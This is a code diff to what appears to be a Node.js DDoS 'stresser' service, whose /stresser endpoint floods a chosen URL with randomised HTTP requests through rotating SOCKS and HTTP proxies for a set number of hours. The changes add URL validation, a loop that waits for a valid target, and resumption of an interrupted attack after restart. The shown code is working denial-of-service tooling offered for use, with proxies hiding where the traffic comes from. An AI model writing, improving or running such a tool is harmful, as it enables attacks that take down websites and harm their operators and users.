@@ -160,7 +160,7 @@ const httpMethods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS']
 
 // Random attack function
 const randomAttack = (url, agent, continueAttack) => {
-    if (!continueAttack) return;
+    if (!continueAttack || !url) return;
 
     const method = getRandomElement(httpMethods);
     const { data: payload, contentType } = generateRandomPayload();
@@ -244,7 +244,7 @@ const randomAttack = (url, agent, continueAttack) => {
 };
 
 const performAttack = (url, agent, continueAttack) => {
-    if (!continueAttack) return;
+    if (!continueAttack || !url) return;
 
     const headersForRequest = {
         "Content-Type": "application/x-www-form-urlencoded",
@@ -335,40 +335,45 @@ const updateState = () => {
 
 setInterval(updateState, 5000);
 
-const startAttack = (url, durationHours) => {
+const waitForValidUrl = (url, durationHours, callback) => {
     if (!url || !/^https?:\/\//.test(url)) {
-        console.error("Invalid URL. Please provide a valid URL starting with http:// or https://");
+        console.log("Waiting for valid URL...");
+        setTimeout(() => waitForValidUrl(url, durationHours, callback), 1000);
         return;
     }
+    callback(url, durationHours);
+};
 
-    const proxies = loadProxies();
-    if (!proxies.length) {
-        console.error("No proxies found. Please add proxies to the proxy file.");
-        return;
-    }
+const startAttack = (url, durationHours) => {
+    waitForValidUrl(url, durationHours, (validUrl, validDuration) => {
+        const proxies = loadProxies();
+        if (!proxies.length) {
+            console.error("No proxies found. Please add proxies to the proxy file.");
+            return;
+        }
 
-    continueAttack = true;
-    targetUrl = url;
-    startTime = Date.now();
-    duration = durationHours * 60 * 60 * 1000; // convert hours to milliseconds
+        continueAttack = true;
+        targetUrl = validUrl;
+        startTime = Date.now();
+        duration = validDuration * 60 * 60 * 1000;
 
-    const attackTimeout = setTimeout(() => {
-        continueAttack = false;
-    }, duration);
+        const attackTimeout = setTimeout(() => {
+            continueAttack = false;
+        }, duration);
 
-    for (let i = 0; i < numThreads; i++) {
-        if (!continueAttack) break;
+        for (let i = 0; i < numThreads; i++) {
+            if (!continueAttack) break;
 
-        const randomProxy = getRandomElement(proxies);
-        const proxyParts = randomProxy.split(":");
-        const proxyProtocol = proxyParts[0].startsWith("socks") ? "socks5" : "http";
-        const proxyUrl = `${proxyProtocol}://${proxyParts[0]}:${proxyParts[1]}`;
-        const agent = proxyProtocol === "socks5" ? new SocksProxyAgent(proxyUrl) : new HttpsProxyAgent(proxyUrl);
+            const randomProxy = getRandomElement(proxies);
+            const proxyParts = randomProxy.split(":");
+            const proxyProtocol = proxyParts[0].startsWith("socks") ? "socks5" : "http";
+            const proxyUrl = `${proxyProtocol}://${proxyParts[0]}:${proxyParts[1]}`;
+            const agent = proxyProtocol === "socks5" ? new SocksProxyAgent(proxyUrl) : new HttpsProxyAgent(proxyUrl);
 
-        // Start both original and random attacks
-        performAttack(url, agent, continueAttack);
-        randomAttack(url, agent, continueAttack);
-    }
+            performAttack(validUrl, agent, continueAttack);
+            randomAttack(validUrl, agent, continueAttack);
+        }
+    });
 };
 
 app.get("/stresser", (req, res) => {
@@ -388,9 +393,9 @@ app.get("/stresser", (req, res) => {
 const port = process.env.PORT || 25694 || Math.floor(Math.random() * (65535 - 1024 + 1)) + 1024;
 app.listen(port, () => {
     console.log(rainbow(`API running on http://localhost:${port}`));
-    if (continueAttack) {
+    if (continueAttack && targetUrl) {
         console.log(rainbow('Resuming previous attack...'));
-        const remainingDuration = (startTime + duration - Date.now()) / (60 * 60 * 1000); // convert milliseconds back to hours
+        const remainingDuration = (startTime + duration - Date.now()) / (60 * 60 * 1000);
         if (remainingDuration > 0) {
             startAttack(targetUrl, remainingDuration);
         }
